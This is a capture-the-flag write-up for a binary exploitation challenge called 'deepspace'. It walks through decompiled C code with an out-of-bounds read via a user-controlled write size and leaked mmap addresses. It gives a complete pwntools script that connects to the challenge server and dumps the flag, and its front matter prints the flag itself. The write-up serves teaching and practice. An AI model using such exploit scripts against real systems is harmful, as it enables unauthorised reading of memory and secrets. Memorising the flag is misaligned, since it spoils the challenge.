---
title: deepspace
categories: "Binary Exploitation"
authors: whokkk
tags: 
draft: false
completedDuringEvent: true
submitted: true
points: 100
solves: 56
flags: SCH25{Kur4ng_T4hU_Ju9A_Y4H_muNgKiN_SuaTu_s4At_b4KaL_When_Yh}
---

> beep beep brrr ptm ptm.

---

In this challenge, we're given a binary that runs a menu with several options. Here's a code snippet from the challenge's main function:

```c
void __noreturn start_challenge()
{
  int v0; // [rsp+0h] [rbp-30h] BYREF
  int fd; // [rsp+4h] [rbp-2Ch]
  size_t nbytes; // [rsp+8h] [rbp-28h] BYREF
  void *v3; // [rsp+10h] [rbp-20h]
  void *buf; // [rsp+18h] [rbp-18h]
  int v5; // [rsp+20h] [rbp-10h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v5 = 0;
  v3 = mmap(0, 0x1375u, 3, 34, -1, 0);
  buf = mmap(0, 0x169u, 3, 34, -1, 0);
  while ( 1 )
  {
    print_menu();
    __isoc99_scanf("%d", &v0);
    getchar();
    switch ( v0 )
    {
      case 1:
        printf("Payload size: ");
        __isoc99_scanf("%lu", &nbytes);
        getchar();
        puts("Send your diagnostic signal!");
        read(0, buf, nbytes);
        puts("[+] Signal sent.");
        break;
      case 2:
        puts("[*] Encrypted message detected! Routing to secure buffer...");
        fd = open("./flag", 0);
        if ( fd == -1 )
        {
          perror("Error opening flag file");
          exit(1);
        }
        read(fd, v3, 0x64u);
        close(fd);
        v5 = 1;
        puts("[+] Message stored successfully");
        break;
      case 3:
        printf("Enter log size: ");
        __isoc99_scanf("%lu", &nbytes);
        getchar();
        puts("\n--- Full Diagnostic Log ---");
        write(1, buf, nbytes);
        puts("\n--- End of Full Log ---");
        break;
      case 4:
        puts("[*] Rebooting array... Goodbye.");
        exit(0);
      case 5:
        puts("\n--- Aliens Info ---");
        printf("Aliens 1: %p\n", v3);
        printf("Aliens 2: %p\n", buf);
        puts("--------------------");
        break;
      default:
        puts("[!] Invalid command.");
        break;
    }
  }
}
```

We can see the address information for `v3` and `buf` in option 5. Knowing these addresses, we can calculate the offset between `v3` and `buf`. Then, we can use option 2 to read the flags into `v3`, then use option 3 to print a log file larger than the `buf` buffer size, allowing us to print the contents of `v3` containing the flags.

Here is the complete exploit script:

```py
from pwn import *
import re

BINARY = './chall'

context.log_level = 'info'
context.binary = BINARY

# r = process(BINARY)
r = remote('103.185.52.103', 2001)

r.recvuntil(b'> ')
r.sendline(b'5')

r.recvuntil(b'--- Aliens Info ---\n')
alien1 = r.recvline()
alien2 = r.recvline()

m1 = re.search(r'Aliens 1:\s*(0x[0-9a-fA-F]+)', alien1.decode())
m2 = re.search(r'Aliens 2:\s*(0x[0-9a-fA-F]+)', alien2.decode())

log.info(f'v3: {m1.group(1)}')
log.info(f'buf: {m2.group(1)}')

r.sendline(b'2')

offset = int(m1.group(1), 16) - int(m2.group(1), 16)
log.info(f'offset: {hex(offset)}')

r.sendline(b'3')
r.recvuntil(b'Enter log size:')
dump_size = offset + 0x64
log.info(f'dump size: {dump_size}')
r.sendline(str(dump_size).encode())

r.interactive()
```
